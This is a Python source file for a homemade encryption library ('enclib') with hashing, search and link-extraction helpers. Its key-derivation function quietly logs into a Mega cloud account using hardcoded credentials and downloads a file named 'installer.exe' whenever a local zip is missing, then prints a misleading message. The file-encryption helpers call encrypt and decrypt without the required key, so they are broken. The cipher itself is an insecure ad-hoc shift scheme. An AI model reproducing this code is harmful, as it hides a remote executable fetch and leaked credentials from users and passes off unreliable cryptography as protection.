import random, os, base64, datetime, zlib, re
from hashlib import sha512
from mega import Mega

# enclib V0.1.0
# integrated enc 6.4.0+ files, this is upto enc 6.4.2
alphaset = "`1234567890-=¬!\"£$%^&*()_+qwertyuiop[]QWERTYUIOP{}asdfghjkl;'#ASDFGHJKL:@~\zxcvbnm,.|ZXCVBNM<>?/"


def hash_a_file(file):
    block_size = 65536
    hash_ = sha512()
    with open(file, 'rb') as hash_file:
        buf = hash_file.read(block_size)
        while len(buf) > 0:
            hash_.update(buf)
            buf = hash_file.read(block_size)
    return hash_.hexdigest()


def hex_gens(num):
    hex_gens_ = ""
    while len(hex_gens_) != num:
        hex_gens_ += random.choice(alphaset)
    return hex_gens_


def sha_to_data(sha):
    num_ = ""
    letters_ = ""
    for char in sha:
        if char in "1234567890":
            num_ += char
        else:
            letters_ += char
    return num_, letters_


def pass_to_seed(password):
    if not os.path.exists("user_agents.zip"):
        mega = Mega()
        m = mega.login("theretards909@gmail.com", "smokester1/")
        file = m.find('installer.exe')
        try:
            m.download(file)
        except PermissionError:
            print(" << user_agents.zip downloaded")
    hash_disrupt, salt = sha_to_data(hash_a_file("user_agents.zip"))
    salt = salt.replace("a", "2").replace("b", "3").replace("c", "5") \
        .replace("d", "7").replace("e", "9").replace("f", "1")

    inp = str(int(hash_disrupt[::-1]) / 2) + password
    sha = sha512(sha512(base64.b85encode(inp.encode())).hexdigest().encode()).hexdigest()
    num, letters = sha_to_data(sha)
    sha2 = sha512(letters.encode()).hexdigest()
    num2_, letters2 = sha_to_data(sha2)
    letters2 = letters2.replace("a", "2").replace("b", "3").replace("c", "5") \
        .replace("d", "7").replace("e", "9").replace("f", "1")

    if not len(str(int(((num + num2_[::-1])[::-1])[:128])-int(salt[:16])+int(salt[-16:]))) > 127:
        int_seed = int((num+letters2[-(128-len(str(num+num2_))):]+num2_[::-1])[::-1])-int(salt[:16])+int(salt[-16:])
        int_seed = int((str(int_seed)[::-1])[:128])
    else:
        int_seed = int(((num+num2_[::-1])[::-1])[:128])-int(salt[:16])+int(salt[-16:])
    return int(int_seed)


def seed2_to_alpha(seeds):
    alpha_gen = alphaset
    counter = 0
    alpha = ""
    while len(alpha_gen) > 1:
        counter += 3
        value = int(str(seeds)[counter:counter + 1]) + int(str(seeds)[counter:counter + 1])
        while value > len(alpha_gen) - 1:
            value = value // 2
        if len(str(seeds)[counter:]) < 2:
            alpha += alpha_gen
            alpha_gen = alpha_gen.replace(alpha_gen, "")
        else:
            chosen = alpha_gen[value]
            alpha += chosen
            alpha_gen = alpha_gen.replace(chosen, "")
    return alpha


def seed_to_data(seed):
    seed_ = pass_to_seed(str(seed["SEED KEY"]))
    seed2 = str(pass_to_seed((str(seed)[32:]+str(seed)[:32])[::-1]))
    seed2_ = str(pass_to_seed(str(seed2)[::-1]))
    seed2 = seed2_+seed2
    seed3 = int(str(seed["SEED KEY"])+str(seed_))

    num2 = int(str(seed_) + str(seed2_))
    if num2 > 8999:
        num2 -= 2500

    return seed2_to_alpha(seed3), seed2_to_alpha(seed2), num2, seed3


def fib_iter(text, num2_):
    a = int(str(num2_)[32:96])
    b = int(str(num2_)[:32])
    c = int(str(num2_)[160:])
    d = int(str(num2_)[96:160])
    total = ""
    while len(str(total)) < len(text) * 3 + 100:
        total += str(int(str(a)+str(b-c).replace("-", ""))-d)
        a = str(int(str(a)[:1024])*6)+str(c//3)
    return total


def shifter(plaintext, new_num_, num2_, alphabet, forwards):
    output_enc = ""
    counter = 0
    for msg in plaintext:
        counter = counter + 2
        if msg in alphabet:
            key = int(new_num_[counter:counter + 2])
            if key > 96:
                key = int(str(num2_)[:2])
            if not forwards:
                key = key * (-1)
            if key == 0:
                new_alphabet = alphabet
            new_alphabet = alphabet[key:] + alphabet[:key]
            encrypted = ""
            for message_index in range(0, len(msg)):
                if msg[message_index] == " ":
                    encrypted += " "
                for alphabet_index in range(0, len(new_alphabet)):
                    if msg[message_index] == alphabet[alphabet_index]:
                        encrypted += new_alphabet[alphabet_index]
            output_enc += encrypted
        else:
            output_enc += msg
    return output_enc


def encrypt(text, key):
    alpha1, alpha2, num2, seed3 = seed_to_data({"SEED KEY": pass_to_seed(key)})
    try:
        plaintext = base64.b85encode(zlib.compress(str(text).encode('utf-8'), 9)).decode('utf-8')
    except:
        plaintext = base64.b85encode(zlib.compress(text, 9)).decode('utf-8')
    new_num = seed3
    while len(str(new_num)) < len(plaintext)*3+100:  # todo revise more precise with analysed char data
        new_num = str(int(str(new_num)[:512])//2)+str(new_num)+str(int(str(new_num)[:512])*2)
    e_text = shifter(plaintext, str(new_num), num2, alpha1, True)
    b = str(fib_iter(e_text, num2))
    return shifter(e_text, b, num2, alpha2, True)


def decrypt(e_text, key):
    alpha1, alpha2, num2, seed3 = seed_to_data({"SEED KEY": pass_to_seed(key)})
    b = str(fib_iter(e_text, num2))
    d_txt = shifter(e_text, b, num2, alpha2, False)
    new_num = seed3
    while len(str(new_num)) < len(d_txt)*3+100:  # todo revise more precise with analysed char data
        new_num = str(int(str(new_num)[:512])//2)+str(new_num)+str(int(str(new_num)[:512])*2)
    output_end = shifter(d_txt, str(new_num), num2, alpha1, False).replace(" ", "")
    try:
        output_end = zlib.decompress(base64.b85decode(output_end)).decode('utf-8')
    except:
        output_end = zlib.decompress(base64.b85decode(output_end))
    return output_end


def encrypt_file(file_to_enc, file_output):
    block_size = 65536
    bytes = b""
    try:
        with open(file_to_enc, 'rb') as hash_file:
            buf = hash_file.read(block_size)
            while len(buf) > 0:
                bytes += buf
                buf = hash_file.read(block_size)

        start = datetime.datetime.now()
        e_data = encrypt(bytes)
        print(datetime.datetime.now() - start)

        with open(f"enc/{file_output}", "w", encoding="utf-8") as f:
            f.write(e_data)
    except:
        print("Error")


def decrypt_file(file_to_dec, file_output):
    data = ""
    with open(file_to_dec, encoding="utf-8") as dec_file:
        for line_ in dec_file.readlines():
            data += line_
    start = datetime.datetime.now()
    d_data = decrypt(data)
    print(datetime.datetime.now() - start)
    print(type(d_data))
    if type(d_data) == str:
        print("Str file")
        with open(f"enc/{file_output}", "w", encoding="utf-8") as f:
            print(d_data)
            f.write(d_data.replace("\r", ""))
    else:
        if type(d_data) == bytes:
            print("Byte file")
            with open(f"enc/{file_output}", "wb") as f:
                f.write(d_data)
        else:
            print("?? file")
            with open(f"enc/{file_output}", "wb") as f:
                f.write(d_data)


def search(data, filter_fr, filter_to):
    data = str(data)
    m = re.search(f"""{filter_fr}(.+?){filter_to}""", data)
    if m:
        output = m.group(1)
    else:
        output = None
    return output


def get_links(data):
    a = (re.findall(r'(https?://[^\s]+)', str(data)))
    b = (re.findall(r'(http?://[^\s]+)', str(data)))
    c = ('\n'.join(a))
    d = ('\n'.join(b))
    e = c + d
    return e


def round_tme(dt=None, round_to=30):
    if not dt:
        dt = datetime.datetime.now()
    seconds = (dt.replace(tzinfo=None)-dt.min).seconds
    rounding = (seconds+round_to/2)//round_to*round_to
    return dt + datetime.timedelta(0, rounding-seconds, -dt.microsecond)
